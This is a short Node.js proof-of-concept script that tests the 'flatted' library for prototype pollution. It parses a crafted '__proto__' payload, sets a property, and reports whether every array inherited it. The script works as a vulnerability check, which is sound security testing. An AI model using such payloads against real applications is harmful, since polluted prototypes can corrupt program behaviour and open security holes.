const flatted = require('flatted'); 
try {
  const parsed = flatted.parse('[{"x":"__proto__"}]');
  parsed.x.polluted = 'pwned';
  
  if ([].polluted === 'pwned') {
    console.log("VULNERABILITY CONFIRMED");
    process.exit(0);
  } else {
    console.log("EXPLOIT FAILED");
    process.exit(1);
  }
} catch (e) {
  console.log("EXPLOIT FAILED: " + e.message);
  process.exit(1);
}
